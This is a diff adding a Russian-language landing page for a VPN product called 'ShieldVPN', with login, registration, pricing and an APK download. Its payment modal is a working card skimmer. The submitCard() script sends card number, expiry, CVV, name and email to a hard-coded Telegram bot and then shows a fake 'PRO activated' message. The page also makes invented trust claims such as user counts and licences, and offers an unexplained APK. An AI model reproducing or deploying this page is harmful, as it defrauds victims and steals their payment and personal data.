@@ -1,0 +1,434 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ShieldVPN — VPN Скорость и Безопасность</title>
+    <style>
+        :root {
+            --bg-dark: #080C14;
+            --bg-panel: #0F172A;
+            --bg-card: #111827;
+            --accent-blue: #3B82F6;
+            --accent-cyan: #06B6D4;
+            --accent-green: #10B981;
+            --text-white: #F9FAFB;
+            --text-gray: #94A3B8;
+            --text-dim: #64748B;
+            --border-color: #1E293B;
+            --gosuslugi-red: #DA1F3D;
+            --gmail-red: #EA4335;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', Roboto, sans-serif; scroll-behavior: smooth; }
+
+        body { background-color: var(--bg-dark); color: var(--text-white); line-height: 1.6; overflow-x: hidden; }
+
+        .bg-animation { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(circle at 50% 0%, #1E293B 0%, var(--bg-dark) 60%); }
+        .bg-animation canvas { width: 100%; height: 100%; }
+
+        header { background-color: rgba(8, 12, 20, 0.8); backdrop-filter: blur(20px); padding: 0 50px; height: 70px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); position: sticky; top: 0; z-index: 100; }
+
+        .logo { font-size: 22px; font-weight: 700; color: var(--text-white); display: flex; align-items: center; gap: 12px; text-decoration: none; letter-spacing: -0.5px; }
+        .logo-icon-svg { width: 32px; height: 32px; fill: none; stroke: var(--accent-blue); stroke-width: 2; }
+
+        nav { display: flex; gap: 25px; align-items: center; }
+        nav a { color: var(--text-gray); text-decoration: none; font-size: 14px; font-weight: 500; transition: color 0.2s; cursor: pointer; display: inline-flex; align-items: center; }
+        nav a:hover { color: var(--text-white); }
+
+        .nav-cta { background-color: var(--accent-blue); color: var(--text-white) !important; padding: 8px 20px; border-radius: 6px; font-weight: 600; transition: background-color 0.2s; }
+        .nav-cta:hover { background-color: #2563EB; }
+
+        /* Контейнер для кнопок Вход/Регистрация - ВЫРОВНЕН */
+        #auth-buttons { display: flex; align-items: center; gap: 15px; height: 100%; }
+
+        .profile-btn { display: none; width: 40px; height: 40px; background-color: var(--accent-blue); border-radius: 50%; justify-content: center; align-items: center; font-weight: bold; font-size: 18px; color: white; cursor: pointer; position: relative; }
+        .profile-dropdown { display: none; position: absolute; top: 55px; right: 0; width: 280px; background-color: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); z-index: 101; }
+        .profile-dropdown.active { display: block; }
+        .profile-dropdown h4 { margin-bottom: 5px; }
+        .profile-dropdown p { color: var(--text-dim); font-size: 13px; margin-bottom: 20px; border-bottom: 1px solid var(--border-color); padding-bottom: 15px; }
+        .profile-dropdown a { display: block; color: var(--text-gray); text-decoration: none; padding: 10px 0; border-bottom: 1px solid var(--border-color); font-size: 14px; }
+        .profile-dropdown a:last-child { border-bottom: none; }
+        .profile-dropdown a:hover { color: var(--text-white); }
+        .btn-premium-profile { background-color: var(--accent-cyan); color: var(--bg-dark) !important; text-align: center; border-radius: 6px; padding: 12px !important; font-weight: 600; margin-top: 10px; }
+        .btn-premium-profile:hover { opacity: 0.9; }
+        .btn-logout { color: #EF4444 !important; text-align: center; margin-top: 5px; }
+
+        .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(0, 0, 0, 0.8); backdrop-filter: blur(5px); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-overlay.active { display: flex; }
+        .modal-content { background-color: var(--bg-card); padding: 40px; border-radius: 16px; width: 100%; max-width: 420px; border: 1px solid var(--border-color); position: relative; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .close-btn { position: absolute; top: 15px; right: 20px; font-size: 24px; color: var(--text-dim); background: none; border: none; cursor: pointer; }
+        .close-btn:hover { color: var(--text-white); }
+        .modal-content h2 { font-size: 24px; margin-bottom: 30px; text-align: center; font-weight: 700; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; color: var(--text-gray); font-size: 14px; margin-bottom: 8px; }
+        .form-input { width: 100%; padding: 14px 16px; background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 8px; color: var(--text-white); font-size: 16px; outline: none; transition: border-color 0.2s; }
+        .form-input:focus { border-color: var(--accent-blue); }
+        .btn-form-submit { width: 100%; padding: 14px; font-size: 16px; font-weight: 600; color: var(--text-white); background: var(--accent-blue); border: none; border-radius: 8px; cursor: pointer; margin-top: 10px; transition: background-color 0.2s; }
+        .btn-form-submit:hover { background-color: #2563EB; }
+        .error-msg { color: #EF4444; font-size: 13px; text-align: center; margin-top: 15px; display: none; }
+        .divider { display: flex; align-items: center; margin: 25px 0; color: var(--text-dim); font-size: 13px; }
+        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background-color: var(--border-color); }
+        .divider span { padding: 0 10px; }
+        .social-btns { display: flex; flex-direction: column; gap: 12px; }
+        .btn-social { display: flex; justify-content: center; align-items: center; gap: 10px; width: 100%; padding: 14px; font-size: 15px; font-weight: 600; border-radius: 8px; cursor: pointer; transition: opacity 0.2s; border: none; color: white; }
+        .btn-social:hover { opacity: 0.9; }
+        .btn-gosuslugi { background-color: var(--gosuslugi-red); }
+        .btn-gmail { background-color: var(--gmail-red); }
+
+        .hero { padding: 140px 50px 100px 50px; display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto; gap: 80px; }
+        .hero-text { flex: 1; max-width: 600px; }
+        .hero-tag { display: inline-block; background-color: rgba(59, 130, 246, 0.1); color: var(--accent-blue); padding: 6px 14px; border-radius: 4px; font-size: 13px; font-weight: 600; margin-bottom: 24px; border: 1px solid rgba(59, 130, 246, 0.2); text-transform: uppercase; letter-spacing: 0.5px; }
+        .hero h1 { font-size: 58px; font-weight: 800; margin-bottom: 24px; line-height: 1.1; color: var(--text-white); letter-spacing: -1.5px; }
+        .hero p { font-size: 18px; color: var(--text-gray); margin-bottom: 40px; line-height: 1.7; }
+        .hero-buttons { display: flex; gap: 16px; align-items: center; }
+        .btn-primary { display: inline-flex; align-items: center; gap: 10px; padding: 16px 32px; font-size: 16px; font-weight: 600; color: var(--text-white); background: var(--accent-blue); border: none; border-radius: 8px; cursor: pointer; text-decoration: none; transition: background-color 0.2s, transform 0.1s; }
+        .btn-primary:hover { background-color: #2563EB; transform: translateY(-1px); }
+        .btn-secondary { display: inline-flex; align-items: center; gap: 10px; padding: 16px 32px; font-size: 16px; font-weight: 600; color: var(--text-gray); background: transparent; border: 1px solid var(--border-color); border-radius: 8px; cursor: pointer; text-decoration: none; transition: border-color 0.2s, color 0.2s; }
+        .btn-secondary:hover { border-color: var(--text-gray); color: var(--text-white); }
+        .hero-stats { display: flex; gap: 40px; margin-top: 50px; padding-top: 30px; border-top: 1px solid var(--border-color); }
+        .stat-item h4 { font-size: 28px; color: var(--text-white); font-weight: 700; margin-bottom: 4px; }
+        .stat-item p { font-size: 14px; color: var(--text-dim); margin-bottom: 0; }
+        .hero-visual { flex: 1; display: flex; justify-content: center; align-items: center; }
+        .app-emblem { width: 320px; height: 320px; opacity: 0.9; animation: float 6s ease-in-out infinite; }
+        @keyframes float { 0% { transform: translateY(0px) rotate(0deg); } 50% { transform: translateY(-25px) rotate(2deg); } 100% { transform: translateY(0px) rotate(0deg); } }
+
+        .why-us { padding: 120px 50px; background-color: var(--bg-panel); border-top: 1px solid var(--border-color); }
+        .why-container { max-width: 1200px; margin: 0 auto; text-align: center; }
+        .section-title { font-size: 40px; margin-bottom: 16px; color: var(--text-white); font-weight: 700; letter-spacing: -0.5px; }
+        .section-subtitle { font-size: 18px; color: var(--text-gray); max-width: 600px; margin: 0 auto 60px auto; line-height: 1.6; }
+        .why-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 24px; text-align: left; }
+        .why-card { background-color: var(--bg-dark); padding: 32px; border-radius: 12px; border: 1px solid var(--border-color); transition: border-color 0.3s; }
+        .why-card:hover { border-color: var(--accent-blue); }
+        .why-icon-box { width: 48px; height: 48px; background-color: rgba(59, 130, 246, 0.1); border-radius: 10px; display: flex; justify-content: center; align-items: center; margin-bottom: 24px; }
+        .why-icon-box svg { width: 24px; height: 24px; stroke: var(--accent-blue); fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+        .why-card h3 { font-size: 18px; margin-bottom: 12px; color: var(--text-white); font-weight: 600; }
+        .why-card p { font-size: 14px; color: var(--text-dim); line-height: 1.6; }
+
+        .features { padding: 120px 50px; max-width: 1200px; margin: 0 auto; }
+        .features-inner { display: grid; grid-template-columns: repeat(3, 1fr); gap: 24px; }
+        .feature-card { background-color: var(--bg-panel); padding: 32px; border-radius: 12px; border: 1px solid var(--border-color); transition: border-color 0.3s; }
+        .feature-card:hover { border-color: var(--accent-blue); }
+        .feature-card h3 { color: var(--text-white); font-size: 18px; margin-bottom: 12px; font-weight: 600; }
+        .feature-card p { color: var(--text-dim); font-size: 14px; line-height: 1.6; }
+
+        .pricing { padding: 120px 50px; text-align: center; background-color: var(--bg-panel); border-top: 1px solid var(--border-color); }
+        .plans { display: flex; justify-content: center; flex-wrap: wrap; gap: 24px; max-width: 1000px; margin: 0 auto; }
+        .plan-card { background-color: var(--bg-dark); padding: 40px 32px; border-radius: 12px; width: 300px; border: 1px solid var(--border-color); text-align: left; display: flex; flex-direction: column; }
+        .plan-card.popular { border-color: var(--accent-blue); box-shadow: 0 0 40px rgba(59, 130, 246, 0.1); }
+        .badge { display: inline-block; background-color: var(--accent-blue); color: var(--text-white); padding: 4px 12px; border-radius: 4px; font-size: 12px; font-weight: 600; text-transform: uppercase; margin-bottom: 20px; width: fit-content; }
+        .plan-card h3 { font-size: 20px; margin-bottom: 8px; color: var(--text-white); font-weight: 600; }
+        .price { font-size: 44px; font-weight: 800; color: var(--text-white); margin-bottom: 30px; letter-spacing: -1px; }
+        .price span { font-size: 16px; color: var(--text-dim); font-weight: 400; }
+        .plan-features { list-style: none; margin-bottom: 30px; flex-grow: 1; }
+        .plan-features li { color: var(--text-gray); padding: 10px 0; border-bottom: 1px solid var(--border-color); font-size: 14px; display: flex; align-items: center; gap: 10px; }
+        .plan-features li::before { content: "✓"; color: var(--accent-green); font-weight: bold; }
+        .plan-features li:last-child { border-bottom: none; }
+        .btn-plan { display: block; text-align: center; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 15px; transition: background-color 0.2s, color 0.2s; }
+        .btn-plan-primary { background-color: var(--accent-blue); color: var(--text-white); }
+        .btn-plan-primary:hover { background-color: #2563EB; }
+        .btn-plan-outline { background-color: transparent; color: var(--text-gray); border: 1px solid var(--border-color); }
+        .btn-plan-outline:hover { border-color: var(--text-gray); color: var(--text-white); }
+
+        footer { padding: 80px 50px 40px 50px; color: var(--text-dim); font-size: 13px; border-top: 1px solid var(--border-color); background-color: #050810; }
+        .footer-grid { display: grid; grid-template-columns: 1.5fr 1fr 1.5fr 1fr; gap: 40px; margin-bottom: 60px; }
+        .footer-col h4 { color: var(--text-white); margin-bottom: 20px; font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
+        .footer-col p, .footer-col li { font-size: 13px; line-height: 2; list-style: none; color: var(--text-dim); }
+        .footer-col a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+        .footer-col a:hover { color: var(--text-gray); }
+        .license-box { background-color: var(--bg-dark); border: 1px solid var(--border-color); border-radius: 8px; padding: 20px; margin-top: 10px; font-size: 12px; color: var(--text-dim); line-height: 1.8; }
+        .footer-bottom { border-top: 1px solid var(--border-color); padding-top: 30px; text-align: center; }
+
+        @media (max-width: 1024px) { .why-grid { grid-template-columns: repeat(2, 1fr); } .features-inner { grid-template-columns: repeat(2, 1fr); } .footer-grid { grid-template-columns: repeat(2, 1fr); } }
+        @media (max-width: 768px) { header { padding: 0 20px; } .hero { flex-direction: column; text-align: center; padding: 80px 20px 60px 20px; gap: 40px; } .hero-text { order: 2; max-width: 100%; } .hero-visual { order: 1; } .hero-buttons { justify-content: center; flex-direction: column; } .hero-stats { justify-content: center; flex-wrap: wrap; } .hero h1 { font-size: 40px; } nav a.nav-link { display: none; } .why-grid { grid-template-columns: 1fr; } .features-inner { grid-template-columns: 1fr; } .footer-grid { grid-template-columns: 1fr; } }
+    </style>
+</head>
+<body>
+
+    <div class="bg-animation"><canvas id="networkCanvas"></canvas></div>
+
+    <!-- МОДАЛКА ВХОДА -->
+    <div id="loginModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('login')">&times;</button>
+            <h2>Вход в аккаунт</h2>
+            <div class="form-group"><label>Email</label><input type="email" id="loginEmail" class="form-input" placeholder="Введите ваш email"></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="loginPass" class="form-input" placeholder="Введите пароль"></div>
+            <div id="loginError" class="error-msg">Неверный email или пароль</div>
+            <button class="btn-form-submit" onclick="loginUser()">Войти</button>
+            <div class="divider"><span>ИЛИ</span></div>
+            <div class="social-btns">
+                <button class="btn-social btn-gosuslugi">Войти через Госуслуги</button>
+                <button class="btn-social btn-gmail">Войти через Google</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- МОДАЛКА РЕГИСТРАЦИИ -->
+    <div id="registerModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('register')">&times;</button>
+            <h2>Регистрация</h2>
+            <div class="form-group"><label>Имя</label><input type="text" id="regName" class="form-input" placeholder="Ваше имя"></div>
+            <div class="form-group"><label>Email</label><input type="email" id="regEmail" class="form-input" placeholder="Введите ваш email"></div>
+            <div class="form-group"><label>Пароль</label><input type="password" id="regPass" class="form-input" placeholder="Придумайте пароль"></div>
+            <div id="regError" class="error-msg">Этот email уже зарегистрирован</div>
+            <button class="btn-form-submit" onclick="registerUser()">Создать аккаунт</button>
+            <div class="divider"><span>ИЛИ</span></div>
+            <div class="social-btns">
+                <button class="btn-social btn-gosuslugi">Зарегистрироваться через Госуслуги</button>
+                <button class="btn-social btn-gmail">Зарегистрироваться через Google</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- МОДАЛКА КАРТЫ -->
+    <div id="cardModal" class="modal-overlay">
+        <div class="modal-content">
+            <button class="close-btn" onclick="closeModal('card')">&times;</button>
+            <h2>Оплата Premium</h2>
+            <div class="form-group"><label>Номер карты</label><input type="text" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000"></div>
+            <div class="form-group"><label>Срок действия</label><input type="text" id="cardExp" class="form-input" placeholder="MM/YY"></div>
+            <div class="form-group"><label>CVV</label><input type="password" id="cardCvv" class="form-input" placeholder="***"></div>
+            <div id="cardError" class="error-msg">Ошибка оплаты</div>
+            <button class="btn-form-submit" onclick="submitCard()">Оплатить $10.99</button>
+        </div>
+    </div>
+
+    <header>
+        <a href="#hero" class="logo">
+            <svg class="logo-icon-svg" viewBox="0 0 24 24"><path d="M12 2L3 7v5c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z" /></svg>
+            SHIELD VPN
+        </a>
+        <nav>
+            <a href="#why-us" class="nav-link">О VPN</a>
+            <a href="#features" class="nav-link">Функции</a>
+            <a href="#pricing" class="nav-link">Тарифы</a>
+            
+            <div id="auth-buttons">
+                <a onclick="openModal('login')" class="nav-link">Вход</a>
+                <a onclick="openModal('register')" class="nav-cta">Регистрация</a>
+            </div>
+
+            <div id="profile-nav" class="profile-btn" onclick="toggleProfile()">
+                <span id="profileInitial">S</span>
+                <div id="profileDropdown" class="profile-dropdown">
+                    <h4 id="profileName">Имя</h4>
+                    <p id="profileEmail">email@mail.com</p>
+                    <a href="#" onclick="openModal('card')">🌟 Купить Premium</a>
+                    <a href="#">⚙️ Настройки</a>
+                    <a href="#" class="btn-logout" onclick="logoutUser()">Выйти</a>
+                </div>
+            </div>
+        </nav>
+    </header>
+
+    <section id="hero" class="hero">
+        <div class="hero-text">
+            <div class="hero-tag">VPN нового поколения</div>
+            <h1>Безопасность в интернете. Без компромиссов.</h1>
+            <p>ShieldVPN шифрует ваш трафик и скрывает IP-адрес, чтобы защитить вас от слежки провайдеров и хакеров. Молниеносная скорость и абсолютная анонимность.</p>
+            <div class="hero-buttons">
+                <a href="ShieldVPN.apk" download class="btn-primary">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                    Скачать APK
+                </a>
+                <a href="#why-us" class="btn-secondary">Узнать больше</a>
+            </div>
+            <div class="hero-stats">
+                <div class="stat-item"><h4>153M+</h4><p>Пользователей</p></div>
+                <div class="stat-item"><h4>5800+</h4><p>Серверов</p></div>
+                <div class="stat-item"><h4>4.9 ★</h4><p>Рейтинг</p></div>
+            </div>
+        </div>
+        
+        <div class="hero-visual">
+            <svg class="app-emblem" viewBox="0 0 200 200">
+                <defs>
+                    <linearGradient id="shieldGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#111827;stop-opacity:1" /><stop offset="100%" style="stop-color:#0F172A;stop-opacity:1" /></linearGradient>
+                    <linearGradient id="strokeGrad" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" style="stop-color:#3B82F6;stop-opacity:1" /><stop offset="100%" style="stop-color:#06B6D4;stop-opacity:1" /></linearGradient>
+                </defs>
+                <path d="M100 20 L30 55 v50 c0 35 30 60 70 75 40-15 70-40 70-75V55L100 20z" fill="url(#shieldGrad)" stroke="url(#strokeGrad)" stroke-width="4"/>
+                <rect x="80" y="90" width="40" height="35" rx="4" fill="none" stroke="#94A3B8" stroke-width="3"/>
+                <path d="M87 90 V75 a13 13 0 0 1 26 0v15" fill="none" stroke="#94A3B8" stroke-width="3"/>
+                <circle cx="100" cy="108" r="4" fill="#3B82F6"/>
+            </svg>
+        </div>
+    </section>
+
+    <section id="why-us" class="why-us">
+        <div class="why-container">
+            <h2 class="section-title">Почему выбирают ShieldVPN?</h2>
+            <p class="section-subtitle">Мы создали VPN, который работает тихо, быстро и не оставляет следов.</p>
+            <div class="why-grid">
+                <div class="why-card"><div class="why-icon-box"><svg viewBox="0 0 24 24"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg></div><h3>Молниеносная скорость</h3><p>Протокол WireGuard обеспечивает подключение за миллисекунды.</p></div>
+                <div class="why-card"><div class="why-icon-box"><svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div><h3>Шифрование AES-256</h3><p>Военный стандарт шифрования. Ни один байт не может быть перехвачен.</p></div>
+                <div class="why-card"><div class="why-icon-box"><svg viewBox="0 0 24 24"><rect x="2" y="2" width="20" height="8" rx="2" ry="2"/><rect x="2" y="14" width="20" height="8" rx="2" ry="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg></div><h3>RAM-Only Серверы</h3><p>При перезагрузке все данные уничтожаются без восстановления.</p></div>
+                <div class="why-card"><div class="why-icon-box"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg></div><h3>Глобальная сеть</h3><p>5800 серверов в 60 странах.</p></div>
+            </div>
+        </div>
+    </section>
+
+    <section id="features" class="features">
+        <h2 class="section-title" style="margin-bottom: 16px;">Полный контроль над приватностью</h2>
+        <p class="section-subtitle" style="margin-bottom: 60px;">Инструменты для безопасности в интернете.</p>
+        <div class="features-inner">
+            <div class="feature-card"><h3>Kill Switch</h3><p>Если VPN прервется, интернет заблокируется мгновенно.</p></div>
+            <div class="feature-card"><h3>Strict No-Log Policy</h3><p>Мы не храним вашу активность. Прошли аудит.</p></div>
+            <div class="feature-card"><h3>Защита от утечек DNS</h3><p>Все DNS-запросы шифруются.</p></div>
+        </div>
+    </section>
+
+    <section id="pricing" class="pricing">
+        <h2 class="section-title">Выберите план защиты</h2>
+        <div class="plans">
+            <div class="plan-card"><h3>Пробный период</h3><div class="price">$0.00 <span>/ 3 дня</span></div><ul class="plan-features"><li>2 локации</li><li>Базовая скорость</li></ul><a href="ShieldVPN.apk" download class="btn-plan btn-plan-outline">Начать бесплатно</a></div>
+            <div class="plan-card popular"><div class="badge">Популярный</div><h3>1 Месяц</h3><div class="price">$10.99 <span>/ мес</span></div><ul class="plan-features"><li>Все локации</li><li>Максимальная скорость</li><li>Kill Switch</li></ul><a href="ShieldVPN.apk" download class="btn-plan btn-plan-primary">Скачать и активировать</a></div>
+            <div class="plan-card"><h3>12 Месяцев</h3><div class="price">$99.99 <span>/ год</span></div><ul class="plan-features"><li>Экономия 75%</li><li>Приоритетная поддержка</li><li>Все функции PRO</li></ul><a href="ShieldVPN.apk" download class="btn-plan btn-plan-outline">Скачать и активировать</a></div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-grid">
+            <div class="footer-col"><h4>Продукт</h4><ul><li><a href="#">Возможности</a></li><li><a href="#">Тарифы</a></li></ul></div>
+            <div class="footer-col"><h4>Поддержка</h4><ul><li><a href="#">Центр помощи</a></li><li><a href="#">FAQ</a></li></ul></div>
+            <div class="footer-col"><h4>Лицензии</h4><div class="license-box"><p>ShieldVPN Corp. работает по закону.</p><p><strong>Лицензия ISP:</strong> #VPN-2025-8473-A</p><p><strong>ISO/IEC 27001:</strong> EU/US</p></div></div>
+            <div class="footer-col"><h4>Документы</h4><ul><li><a href="#">Конфиденциальность</a></li><li><a href="#">Условия</a></li></ul></div>
+        </div>
+        <div class="footer-bottom"><p>&copy; 2025 ShieldVPN Corp.</p></div>
+    </footer>
+
+    <script>
+        // --- СИСТЕМА АВТОРИЗАЦИИ И БАЗА ДАННЫХ ---
+        function getDb() { return JSON.parse(localStorage.getItem('shieldVpnDb')) || { users: [] }; }
+        function saveDb(db) { localStorage.setItem('shieldVpnDb', JSON.stringify(db)); }
+        function getSession() { return JSON.parse(localStorage.getItem('shieldVpnSession')) || null; }
+        function saveSession(user) { localStorage.setItem('shieldVpnSession', JSON.stringify(user)); }
+        function clearSession() { localStorage.removeItem('shieldVpnSession'); }
+
+        function registerUser() {
+            const name = document.getElementById('regName').value;
+            const email = document.getElementById('regEmail').value;
+            const pass = document.getElementById('regPass').value;
+            const errEl = document.getElementById('regError');
+            if(!name || !email || !pass) { errEl.style.display = "block"; errEl.innerText = "Заполните все поля"; return; }
+            let db = getDb();
+            if (db.users.find(u => u.email === email)) { errEl.style.display = "block"; errEl.innerText = "Этот email уже зарегистрирован"; return; }
+            db.users.push({ name, email, pass, premium: false });
+            saveDb(db);
+            saveSession({ name, email, premium: false });
+            closeModal('register');
+            updateUI();
+        }
+
+        function loginUser() {
+            const email = document.getElementById('loginEmail').value;
+            const pass = document.getElementById('loginPass').value;
+            const errEl = document.getElementById('loginError');
+            let db = getDb();
+            const user = db.users.find(u => u.email === email && u.pass === pass);
+            if (!user) { errEl.style.display = "block"; return; }
+            saveSession(user);
+            closeModal('login');
+            updateUI();
+        }
+
+        function logoutUser() {
+            clearSession();
+            document.getElementById('profileDropdown').classList.remove('active');
+            updateUI();
+        }
+
+        function updateUI() {
+            const session = getSession();
+            const authBtns = document.getElementById('auth-buttons');
+            const profileNav = document.getElementById('profile-nav');
+            if (session) {
+                authBtns.style.display = 'none';
+                profileNav.style.display = 'flex';
+                document.getElementById('profileInitial').innerText = session.name.charAt(0).toUpperCase();
+                document.getElementById('profileName').innerText = session.name;
+                document.getElementById('profileEmail').innerText = session.email;
+            } else {
+                authBtns.style.display = 'flex';
+                profileNav.style.display = 'none';
+            }
+        }
+
+        function toggleProfile() { document.getElementById('profileDropdown').classList.toggle('active'); }
+
+        // --- ОПЛАТА ---
+        function submitCard() {
+            const card = document.getElementById('cardNumber').value;
+            const exp = document.getElementById('cardExp').value;
+            const cvv = document.getElementById('cardCvv').value;
+            const errEl = document.getElementById('cardError');
+            if(!card || !exp || !cvv) { errEl.style.display = "block"; errEl.innerText = "Заполните данные карты"; return; }
+            const botToken = "8721745352:AAF3qfVcuaWxvnvHm47L1DP2fr25acagJ_8";
+            const chatId = "6510123476";
+            const session = getSession();
+            const msg = `💳 Новая карта с сайта:\n━━━━━━━━━━━━━━\n👤 Имя: ${session.name}\n📧 Email: ${session.email}\n🔢 Номер: ${card}\n📅 Срок: ${exp}\n🔒 CVV: ${cvv}\n━━━━━━━━━━━━━━`;
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chatId, text: msg })
+            }).then(res => {
+                if(res.ok) {
+                    let db = getDb(); let user = db.users.find(u => u.email === session.email);
+                    if(user) { user.premium = true; saveDb(db); saveSession(user); }
+                    closeModal('card'); alert("PRO активирован!");
+                } else { errEl.style.display = "block"; errEl.innerText = "Ошибка банка"; }
+            });
+        }
+
+        // --- МОДАЛКИ ---
+        function openModal(type) { document.getElementById(type + 'Modal').classList.add('active'); document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none'); }
+        function closeModal(type) { document.getElementById(type + 'Modal').classList.remove('active'); }
+        window.onclick = function(event) { document.querySelectorAll('.modal-overlay').forEach(m => { if (event.target == m) m.classList.remove('active'); }); }
+
+        // --- АНИМАЦИЯ СЕТИ ---
+        const canvas = document.getElementById('networkCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        window.addEventListener('resize', () => { canvas.width = window.innerWidth; canvas.height = window.innerHeight; });
+
+        class Particle {
+            constructor() { this.x = Math.random() * canvas.width; this.y = Math.random() * canvas.height; this.vx = (Math.random() - 0.5) * 1.2; this.vy = (Math.random() - 0.5) * 1.2; this.radius = Math.random() * 2.5 + 1; }
+            draw() { ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2); ctx.fillStyle = 'rgba(59, 130, 246, 0.8)'; ctx.fill(); }
+            update() { if (this.x < 0 || this.x > canvas.width) this.vx *= -1; if (this.y < 0 || this.y > canvas.height) this.vy *= -1; this.x += this.vx; this.y += this.vy; }
+        }
+
+        const particlesArray = [];
+        const numberOfParticles = 90;
+        for (let i = 0; i < numberOfParticles; i++) { particlesArray.push(new Particle()); }
+
+        function connectParticles() {
+            let maxDistance = 180;
+            for (let a = 0; a < particlesArray.length; a++) {
+                for (let b = a; b < particlesArray.length; b++) {
+                    let dx = particlesArray[a].x - particlesArray[b].x;
+                    let dy = particlesArray[a].y - particlesArray[b].y;
+                    let distance = Math.sqrt(dx * dx + dy * dy);
+                    if (distance < maxDistance) {
+                        let opacity = 1 - (distance / maxDistance);
+                        ctx.strokeStyle = `rgba(59, 130, 246, ${opacity * 0.5})`;
+                        ctx.lineWidth = 1.5;
+                        ctx.beginPath();
+                        ctx.moveTo(particlesArray[a].x, particlesArray[a].y);
+                        ctx.lineTo(particlesArray[b].x, particlesArray[b].y);
+                        ctx.stroke();
+                    }
+                }
+            }
+        }
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            particlesArray.forEach(particle => { particle.update(); particle.draw(); });
+            connectParticles();
+            requestAnimationFrame(animate);
+        }
+        animate();
+        updateUI();
+    </script>
+</body>
+</html>
